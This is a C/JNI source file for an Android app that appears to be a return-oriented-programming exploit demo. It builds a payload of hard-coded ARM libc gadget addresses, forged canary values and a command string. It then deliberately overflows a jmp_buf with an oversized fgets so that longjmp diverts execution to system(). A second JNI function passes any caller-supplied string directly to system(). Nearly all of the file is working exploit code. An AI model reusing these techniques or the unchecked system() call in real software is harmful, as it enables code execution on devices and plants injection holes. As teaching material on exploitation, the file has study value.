#include <jni.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <setjmp.h>
#include <unistd.h>
#include "com_ch0psticks_rop_MainActivity.h"

typedef struct foo{
	char buf[200];
	jmp_buf jb;
}FOO, *PFOO;


bool GeneratePayload(unsigned long BaseAddr, char * filePath)
{
	FILE *fPayload;
	char *buf;
	int bufsize;
	char *command = "am start -n com.android.term/.Term";
	enum{r4=0, r5, r6, r7, r8, r9, r10, r11, r12, sp, lr};

	bufsize = 200+64*4;
	buf = (char*)malloc(bufsize);
	memset(buf, 0, bufsize);

	strcpy(buf, command);
	//*r4, *r5,*r6, *r7,*r8, *r9,*r10, *r11,*r12, *sp, *lr;

	unsigned int* registers[11]={NULL};
	unsigned int* canary[2];

	canary[0] = (unsigned int*)(buf+200);
	canary[1] = (unsigned int*)(buf+200+4);
	*(canary[0]) = 0x4278f501;
	*(canary[1]) = 0x00001204;

	int counter = 0;
	for (counter=0;counter<11;counter++)
	{
		registers[counter] = (unsigned int*)(buf+200+0x4c+counter*4);
	}




//init registers from r4 to r12, sp and lr.
//	///////////////////////////////////////////////////////////////////
//	/****single rop gadget****/
//	0xafd1cf07:	adds	r0, r7, #0
//	0xafd1cf09:	adds	r1, r6, #0
//	0xafd1cf0b:	blx	r5

//	*(registers[lr]) = 0xafd1cf07; //jump to addr of seq2 'add r0, r7, #0; add r1, r6, #0; blx r5'
//	*(registers[r7]) = BaseAddr;   //set r7 point to addr of COMMAND STRING
//	*(registers[r5]) = 0xafd17ff4; //fd8; //set r5 point to addr of SYSTEM functio


//	/****single rop gadget****/
//	0xafd12076 <dlmalloc_walk_heap+94>:	adds	r0, r4, #0
//	0xafd12078 <dlmalloc_walk_heap+96>:	blx	r7
//	*(registers[lr]) = 0xafd12076;
//	*(registers[r4]) = BaseAddr;
//	*(registers[r7]) = 0xafd17ff4;
//
//	*(registers[sp]) = 0x2af3e0; //let sp not equal zero.


//	http://ropshell.com/search?h=9747064c1b9020fc091f288ef8cf65a7
//	ldr r0 % blx%
//	/****single ROP gadget****/
//	   0xafd2e98a <__res_nsend+894>:	ldr	r0, [sp, #68]	; 0x44
//	   0xafd2e98c <__res_nsend+896>:	ldr	r1, [sp, #72]	; 0x48
//	   0xafd2e98e <__res_nsend+898>:	ldr	r2, [sp, #76]	; 0x4c
//	   0xafd2e990 <__res_nsend+900>:	ldr	r3, [sp, #52]	; 0x34
//	   0xafd2e992 <__res_nsend+902>:	blx	r4
//	*(registers[sp]) = BaseAddr-68;
//	*(registers[r4]) = 0xafd17ff4;
//	*(registers[lr]) = 0xafd2e98a;

//	/******single ROP gadget******/
//	//0x2eaf7 : ldr r0 [sp #88] ; ldr r1 [sp #84] ; ldr r2 [sp #80] ; ldr r3 [sp #52] ; blx r4 ;;
//	*(registers[sp]) = BaseAddr-88;
//	*(registers[r4]) = 0xafd17ff4;
//	*(registers[lr]) = 0xafd2eaf7;
//thumb instruction sets, short jump@


	*(registers[r5]) = 0xafd1715f;  //ULB-m add	sp, #8; pop	{r4}; pop {r3}; add	sp, #8; bx	r3
	*(registers[lr]) = 0xafd1715f;
	*(registers[r7]) = BaseAddr; //string

	*(registers[sp]) = BaseAddr+100; //keep 100bytes for command string

	//thumb:   adds	r0, r7, #0;  adds	r1, r6, #0;;blx	r5
	*((unsigned long*)(buf+100+12)) = 0xafd1cf07; //buf+100-->sp,sp+12
	*((unsigned long*)(buf+100+12+24))  = 0xafd17fd8+1;// addr of system



	fPayload = fopen(filePath, "wb");
	if (fPayload == NULL)
		return false;

	fwrite(buf, sizeof(char), bufsize, fPayload);
	fclose(fPayload);

	return true;
}
int exploit(char * filePath, int XXX)
{
	FILE *sFile;

	PFOO f;
	bool bFile;
	int size=0;
	size = sizeof(FOO);
	f = (PFOO)malloc(size);

	bFile = GeneratePayload((unsigned long)f, filePath);
	if (bFile==false)
		return 0;

	sFile = fopen(filePath, "rb");
	if(sFile == NULL)
		return 0;

	memset(f, 0, size);
	int i;
	i = setjmp(f->jb);
	if (i!=0)
		return 0;
	fgets(f->buf, 456, sFile);
	longjmp(f->jb, 2);
	return 1;
}

JNIEXPORT jstring JNICALL Java_com_ch0psticks_rop_MainActivity_ExecRop(
		JNIEnv *env, jobject obj, jstring filePath, jint size)
{

	int ret = exploit("/mnt/sdcard/exploit.bin", size);
	char retStr[256] = {0};
	if (ret==1)
		strcpy(retStr, "Rop Exploit Successfully!");
	else
		strcpy(retStr, "Rop Exploit failed");
	return env->NewStringUTF(retStr);
}

JNIEXPORT jstring JNICALL Java_com_ch0psticks_rop_MainActivity_TestCommand
  (JNIEnv *env, jobject obj, jstring strCommand){
	char retStr[256]={0};
	if (strCommand == NULL){
		strcpy(retStr, "empty command!");
	}else{
		system((char*)(env->GetStringUTFChars(strCommand, 0)));
		strcpy(retStr, "command Executed!");
	}
	return env->NewStringUTF(retStr);
}

